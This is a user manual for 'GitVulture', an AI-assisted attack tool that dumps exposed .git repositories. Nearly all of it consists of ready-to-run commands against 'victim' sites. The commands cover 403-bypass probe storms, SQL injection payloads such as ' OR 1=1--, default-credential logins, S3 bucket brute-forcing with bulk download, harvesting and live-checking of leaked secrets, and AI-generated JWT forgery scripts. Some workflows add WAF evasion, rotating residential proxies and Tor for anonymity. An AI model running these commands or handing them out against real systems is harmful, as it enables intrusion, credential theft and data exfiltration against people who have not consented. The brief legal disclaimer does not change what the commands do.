# 📖 AIGitsploit / GitVulture — Complete Manual

> Everything the tool can do, every flag, and every usage scenario.

---

## Part I — One-Click Installation

| Your OS | Double-click | Manual command |
|---|---|---|
| **Linux** (Kali, Ubuntu, Debian, Arch, Fedora, openSUSE, Alpine) / **WSL** | `install.sh` | `bash install.sh` |
| **macOS** (Intel & Apple Silicon) | `install.command` | `bash install.command` |
| **Windows 10/11** | `install.bat` | Right-click → *Run as administrator* |

The installer auto-detects the OS, installs **git + Python 3.10+ + pip + venv** (using `apt` / `dnf` / `pacman` / `brew` / `winget`), clones the repo, creates a virtualenv, installs all dependencies (including the private `emergentintegrations` package), writes the LLM key to `~/.gitvulture.env`, and adds a `gitvulture` shortcut to your shell. **Total time: 1–3 minutes.**

After install, open a **new** terminal:
```bash
gitvulture --help
```

Override defaults with env vars before launching:
```bash
AIGITSPLOIT_HOME=/opt/aigitsploit \
EMERGENT_LLM_KEY=sk-emergent-mykey \
AIGITSPLOIT_REPO=https://github.com/me/fork.git \
bash install.sh
```

---

## Part II — What GitVulture Does (every feature)

GitVulture is a **full attack pipeline**, not just a downloader. It runs in 7 standard phases, then optionally climbs a **16-level autonomous escalation ladder** driven by Claude Sonnet 4.5.

### Standard pipeline (always runs)

| # | Phase | What it does |
|---|---|---|
| 1 | **Reconnaissance** | Probes `/.git/HEAD`, `/.git/config`, `/.git/description`. Detects the web server (nginx/Apache/IIS) and the WAF (Cloudflare, AWS WAF, Akamai, Imperva…). Decides whether directory listing is on. |
| 2 | **Ref discovery** | Reads `HEAD`, `packed-refs`, `info/refs`, `FETCH_HEAD`, `ORIG_HEAD`, `MERGE_HEAD`, `logs/HEAD`, `logs/refs/**`, every `refs/heads/*`, `refs/tags/*`, `refs/stash`, plus the binary `.git/index`. Mines reflog ghost-commits (force-pushed / rebased) that no other tool finds. |
| 3 | **Object acquisition** | Three engines in parallel: (a) pack-file streaming via `pack-*.idx`; (b) loose-object recursive download; (c) BFS commit-graph walker that uses every freshly-parsed object to discover new SHAs. Also parses `.git/index` to recover the full file tree even when objects are 403-blocked. |
| 4 | **Reconstruction** | `git fsck --full --lost-found`, branch checkout for every discovered ref, dangling-commit / dangling-blob extraction. |
| 5 | **Secret hunt** | 25+ regex rules merged from Gitleaks + TruffleHog (AWS, GitHub PAT/OAuth/App, Stripe live/test, Slack, SendGrid, Mailgun, JWT, generic env passwords, DB connection strings, RSA/SSH private keys). Walks **every commit's diff**, every dangling object, every reflog entry, and the working tree. |
| 6 | **Live verification (opt-in)** | Validates leaked tokens by hitting the real AWS/GitHub/Stripe/Slack/SendGrid APIs to confirm they are still active. Off by default — see legal note. |
| 7 | **AI triage** | Sends a *redacted* summary of findings to Claude Sonnet 4.5, gets back: executive summary, risk score 0-100, lab pattern detection (PortSwigger / HackTheBox / TryHackMe), top findings ranked, and concrete exploitation steps. |

### Escalation ladder (`--escalate` flag — 16 levels)

| L | Name | What it does |
|---|---|---|
| **L1** | Hardened `.git` Bypass Storm | 800+ probes per blocked asset: path tricks (`%2e`, `//`, `;.css`, `?id=1`, `%00`…), header tricks (`X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For: 127.0.0.1`…), method overrides (HEAD/POST/TRACE/PROPFIND/MOVE/COPY/LOCK), encoding tricks. |
| **L2** | Upstream Repository Pivot | Parses `.git/config`, derives `github.com/<org>/<repo>`, probes the public landing page, GitHub REST API (`/repos/...`), and Wayback Machine archive for historical clones. |
| **L3** | Index → Endpoint Synthesis | Converts every recovered Controller / Service file name into likely HTTP endpoints (`AuthController.php` → `/api/auth/...`) and probes them. |
| **L4** | Hidden File Probes | 70+ classic leaks: `.env`, `.env.production`, `composer.json`, `package-lock.json`, `backup.sql`, `.DS_Store`, `phpinfo.php`, `.svn/entries`, `id_rsa`, `.bash_history`, `Dockerfile`, `docker-compose.yml`, `swagger.json`, etc. |
| **L5** | Auth Surface Fingerprint | Probes 18 common login pages, extracts CSRF tokens, detects the framework (Laravel/Django/Express/WordPress/PHP-FPM…), and **optionally** (`--offensive`) tries 10 default-credential POSTs. |
| **L6** | AI Autonomous Probing | Claude reads everything found so far and proposes up to 25 fresh URLs to probe. The engine fires them and feeds the results back to Claude. |
| **L7** | Secret Super-Scan | Re-runs all 25+ rules on every byte collected during L1–L6. |
| **L9** | Aggressive Blob Retrieval | For every SHA in `.git/index`, fires ~80 bypass variants against `objects/xx/yyyy` + the headers list + a "direct-webroot" trick. zlib-decodes successful objects and restores them as readable source files to `recovered_source/`. |
| **L10** | Pack-File Hunt | Brute-forces `pack-<sha>.pack` / `.idx` names using known commit hashes. |
| **L11** | Recovered-Source Super-Scan | Walks `recovered_source/` and runs every secret rule against the actual source code we got back. |
| **L12** | AI Second-Wave Probing | Claude reads the recovered source snippets and proposes 25 MORE URLs based on the actual application logic. |
| **L13** | SQL Injection Probing | Tests every discovered endpoint with classic SQLi payloads (`'`, `' OR 1=1--`, time-based, error-based, UNION). Read-only — never extracts data. |
| **L14** | Crypto Attacks (JWT / Keys) | Detects JWTs in responses, analyses recovered RSA/EC keys, checks for weak algorithms (`alg: none`, HS256 with public key), generates signing candidates. |
| **L15** | AI Forgery Lab | Claude reads the recovered keys + crypto code and **generates a self-contained Python proof-of-impact script** (e.g., a JWT forger) saved to `forgery/forge_*.py`. |
| **L16** | AWS S3 Enumeration | Detects S3 hostnames in the target URL + recovered source. Probes each bucket's region; if ListBucket is open, paginates through everything (>1000 objects supported) and downloads every object. If 403, brute-forces objects using paths from `.git/index`. Then bruteforces sibling buckets (`<base>-prod`, `<base>-backup`, etc.). Scans every downloaded object for secrets and extracts AWS access keys (`AKIA`/`ASIA`). |
| **L8** | Final AI Strategy | Claude reviews the entire kill chain and emits a strict-JSON report: verdict (compromise / partial / metadata-only / no-go), risk score 0-100, 5-8-sentence narrative, step-by-step kill chain with evidence and expected outcome, top recommendations, and reasons the automation stopped. |

### Sqlmap-style storage

```
~/.gitvulture/output/
└── <host>/                              # one folder per target
    ├── latest -> 20260605-181412/       # symlink to most recent
    ├── 20260605-181412/                 # UTC-timestamped scan
    │   ├── .git/                        # reconstructed repo
    │   ├── recovered_source/            # decoded source files
    │   ├── recovered_blobs/             # raw zlib objects
    │   ├── s3/                          # L16 downloaded objects
    │   │   ├── <bucket1>/...
    │   │   └── <bucket2>/...
    │   ├── forgery/forge_*.py           # L15 AI-generated PoC
    │   ├── target.txt                   # plain target URL
    │   └── gitvulture-report.json       # full machine-readable report
    └── ...
```

---

## Part III — Every CLI Flag with Examples

```text
gitvulture [TARGET_URL] [OPTIONS]
```

### Flag summary

| Flag | Default | Section |
|---|---|---|
| `target` *(positional)* | — | [§1](#1-target) |
| `-o`, `--output` | auto (sqlmap-style) | [§2](#2--o---output) |
| `--list-targets` | — | [§3](#3---list-targets) |
| `--ai` | off | [§4](#4---ai) |
| `--escalate` | off | [§5](#5---escalate) |
| `--offensive` | off | [§6](#6---offensive) |
| `--verify-secrets` | off | [§7](#7---verify-secrets) |
| `--s3-bucket NAME` | — | [§8](#8---s3-bucket) |
| `--insecure` | off | [§9](#9---insecure) |
| `--no-bypass-403` | off | [§10](#10---no-bypass-403) |
| `--rotate-ua` | off | [§11](#11---rotate-ua) |
| `--proxy URL` | — | [§12](#12---proxy) |
| `--proxy-list FILE` | — | [§13](#13---proxy-list) |
| `--rate-limit N` | 30 req/s | [§14](#14---rate-limit) |
| `--concurrency N` | 20 | [§15](#15---concurrency) |
| `--timeout N` | 15 s | [§16](#16---timeout) |
| `--json` | off | [§17](#17---json) |

---

### 1. `target`
The URL to attack. Must start with `http://` or `https://`. Don't include `/.git/`.

```bash
gitvulture https://victim.example.com
```

---

### 2. `-o`, `--output`
Where to write the dump. **If omitted**, GitVulture auto-creates a folder under `~/.gitvulture/output/<host>/<UTC-timestamp>/` (sqlmap-style).

```bash
gitvulture https://victim.example.com                       # auto: ~/.gitvulture/output/...
gitvulture https://victim.example.com -o /tmp/job1          # explicit
```

Override the base dir entirely:
```bash
export GITVULTURE_HOME=/data/scans   # → /data/scans/output/<host>/<ts>/
gitvulture https://victim.example.com
```

---

### 3. `--list-targets`
Lists every host + scan stored under `~/.gitvulture/output/`.

```bash
gitvulture --list-targets
```

---

### 4. `--ai`
Enables Claude Sonnet 4.5 triage (Phase 7). Requires `EMERGENT_LLM_KEY` in `~/.gitvulture.env` (the installer sets this).

```bash
gitvulture https://victim.example.com --ai
```

---

### 5. `--escalate`
Activates the full 16-level escalation ladder. Best paired with `--ai`.

```bash
gitvulture https://victim.example.com --ai --escalate
```

---

### 6. `--offensive`
**Opt-in**: lets L5 issue real POST requests with default credentials (`admin/admin`, `root/toor`, …). Off by default for legal safety.

```bash
gitvulture https://my-ctf-lab.local --ai --escalate --offensive
```

---

### 7. `--verify-secrets`
**Opt-in**: validates leaked tokens by calling AWS / GitHub / Stripe / Slack / SendGrid APIs. The issuer logs your IP — only run against your own assets.

```bash
gitvulture https://my-asset.local --verify-secrets
```

---

### 8. `--s3-bucket`
Adds an explicit S3 bucket to enumerate in L16. Repeatable. Accepts plain bucket names or full URLs.

```bash
# One extra bucket
gitvulture https://victim.com --escalate --s3-bucket victim-backup

# Several buckets
gitvulture https://victim.com --escalate \
    --s3-bucket victim-prod \
    --s3-bucket victim-staging \
    --s3-bucket victim-archive

# Pure S3 hunt (no .git target)
gitvulture https://victim.s3.amazonaws.com --escalate \
    --s3-bucket victim --s3-bucket victim-backup
```

---

### 9. `--insecure`
Skip SSL certificate verification. Essential for PortSwigger / HackTheBox labs that serve their own certs.

```bash
gitvulture https://0a1b.web-security-academy.net --insecure
```

---

### 10. `--no-bypass-403`
Disables the path/header bypass chain on 401/403/404 (default = on).

```bash
gitvulture https://victim.com --no-bypass-403
```

---

### 11. `--rotate-ua`
Picks a random User-Agent on every request (8 real-world UAs).

```bash
gitvulture https://victim.com --rotate-ua
```

---

### 12. `--proxy`
Route everything through one proxy (HTTP / HTTPS / SOCKS5).

```bash
# Burp
gitvulture https://victim.com --proxy http://127.0.0.1:8080

# Authenticated HTTP proxy
gitvulture https://victim.com --proxy http://user:pass@proxy.local:3128

# SOCKS5 home proxy
gitvulture https://victim.com --proxy socks5://192.168.1.50:1080

# Tor
gitvulture https://victim.onion --proxy socks5://127.0.0.1:9050 --timeout 45
```

---

### 13. `--proxy-list`
Round-robin rotation through a list. Lines starting with `#` are ignored.

```bash
cat > pool.txt <<EOF
http://user:pass@1.2.3.4:8000
http://user:pass@1.2.3.5:8000
socks5://user:pass@1.2.3.6:1080
EOF

gitvulture https://victim.com --proxy-list pool.txt --rotate-ua
```

---

### 14. `--rate-limit`
Maximum req/s (adaptive — backs off on 429/503). Lower for production, higher for labs.

```bash
gitvulture https://lab.local --rate-limit 60          # aggressive lab
gitvulture https://prod.site --rate-limit 3           # polite prod
```

---

### 15. `--concurrency`
Number of parallel requests (bounded by `--rate-limit`).

```bash
gitvulture https://lab.local --concurrency 50 --rate-limit 60
gitvulture https://prod.site --concurrency 5  --rate-limit 3
```

---

### 16. `--timeout`
Per-request timeout (seconds). Increase for slow proxies / Tor.

```bash
gitvulture https://victim.onion --proxy socks5://127.0.0.1:9050 --timeout 45
```

---

### 17. `--json`
Dump the full machine-readable report to stdout. The same data is always written to `<scan_dir>/gitvulture-report.json`.

```bash
gitvulture https://victim.com --ai --json | jq '.ai_report.risk_score'
gitvulture https://victim.com --json > report.json
```

---

## Part IV — Every Realistic Workflow

### A) Quick recon (no AI, no escalation) — fastest, free
```bash
gitvulture https://target.example.com
```

### B) Recon + AI triage — recommended baseline
```bash
gitvulture https://target.example.com --ai
```

### C) **Full power** — every layer, every level (slowest)
```bash
gitvulture https://target.example.com --ai --escalate --insecure --rotate-ua
```

### D) CTF lab (PortSwigger / HackTheBox / TryHackMe / VulnHub)
```bash
gitvulture https://0a1b2c3d.web-security-academy.net \
    --ai --escalate --offensive --verify-secrets \
    --insecure --rotate-ua \
    --rate-limit 50 --concurrency 50
```

### E) Stealthy bug-bounty recon (slow, through Burp)
```bash
gitvulture https://prod.target.com \
    --ai --escalate \
    --proxy http://127.0.0.1:8080 \
    --rotate-ua \
    --rate-limit 4 --concurrency 4 \
    --timeout 30
```

### F) Through Tor (max anonymity)
```bash
sudo systemctl start tor
gitvulture https://victim.example.com \
    --proxy socks5://127.0.0.1:9050 \
    --timeout 45 --rate-limit 2 --concurrency 4 \
    --ai
```

### G) Rotating residential pool
```bash
gitvulture https://target.com \
    --proxy-list ~/proxies/residential.txt \
    --rotate-ua \
    --rate-limit 10 \
    --ai --escalate
```

### H) S3 enumeration only (no .git on the target)
```bash
gitvulture https://target.s3.amazonaws.com --escalate \
    --s3-bucket target --s3-bucket target-backup \
    --s3-bucket target-prod --s3-bucket target-archive
```

### I) Combined Git + S3 (the most powerful combo)
```bash
gitvulture https://target.com \
    --ai --escalate --insecure \
    --s3-bucket target-cdn --s3-bucket target-uploads
```

### J) WAF-aware scan (slower, headers rotated)
```bash
gitvulture https://protected-site.com \
    --rotate-ua --rate-limit 3 --concurrency 3 \
    --proxy http://127.0.0.1:8080
```

### K) Without AI (privacy-first / offline-ish)
```bash
gitvulture https://target.com --escalate
# L6, L8, L12, L15 will skip their AI calls; everything else still runs.
```

### L) JSON output for CI/automation
```bash
gitvulture https://target.com --ai --json 2>/dev/null \
    | jq '{risk: .ai_report.risk_score, verdict: .escalation.ai_strategy.verdict}'
```

### M) Re-scan an existing host (each run gets a new timestamp folder)
```bash
gitvulture https://target.com --ai --escalate
gitvulture --list-targets                       # see history
```

### N) Custom install location + custom LLM key (env-driven)
```bash
GITVULTURE_HOME=/data/scans \
EMERGENT_LLM_KEY=sk-emergent-other \
gitvulture https://target.com --ai --escalate
```

### O) Quick reference / help
```bash
gitvulture --help
```

---

## Part V — Reading the JSON Report

```bash
REPORT=~/.gitvulture/output/target.com/latest/gitvulture-report.json

# Top-level summary
jq '{phase, duration_s, findings: (.findings | length), risk: .ai_report.risk_score, verdict: .escalation.ai_strategy.verdict}' "$REPORT"

# Every critical finding
jq '.findings[] | select(.severity=="critical")' "$REPORT"

# All discovered branches
jq '.refs.branches | keys' "$REPORT"

# L16 buckets
jq '.escalation.stages[] | select(.level==16) | .artifacts.buckets' "$REPORT"

# L9 recovered source files
jq '.escalation.stages[] | select(.level==9) | .artifacts.files_saved' "$REPORT"

# Final kill chain
jq '.escalation.ai_strategy.kill_chain' "$REPORT"
```

---

## Part VI — Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `gitvulture: command not found` | New alias not loaded | Open a new terminal or `source ~/.bashrc` |
| `ERROR: No matching distribution found for emergentintegrations` | Private index missing | Re-run the installer (it adds `--extra-index-url`) |
| `EMERGENT_LLM_KEY not configured` | Key file missing | `echo 'EMERGENT_LLM_KEY=sk-emergent-…' > ~/.gitvulture.env; chmod 600 ~/.gitvulture.env` |
| Lots of 429 / 503 | Rate-limited by target/WAF | Lower `--rate-limit` to 3-5, add `--rotate-ua` |
| `ssl.SSLCertVerificationError` | Lab uses self-signed cert | Add `--insecure` |
| 0 findings / "no .git exposure" | Directory not actually exposed | `curl -I https://target/.git/HEAD` to confirm |
| Scan hangs at recon | Network/DNS issue | `curl -v https://target/` to debug |
| `httpx.ProxyError` | Proxy down/misconfigured | `curl --proxy <url> https://example.com` to test |

---

## Part VII — Legal

GitVulture issues real HTTP requests. Use it **only** against:
- Assets you own
- CTF labs (PortSwigger, HackTheBox, TryHackMe, VulnHub)
- Bug bounty targets *explicitly in scope*

The `--offensive` and `--verify-secrets` flags both make active outbound calls to third parties. The author and contributors assume **no responsibility** for misuse.

---

**Happy hunting.** 🦅
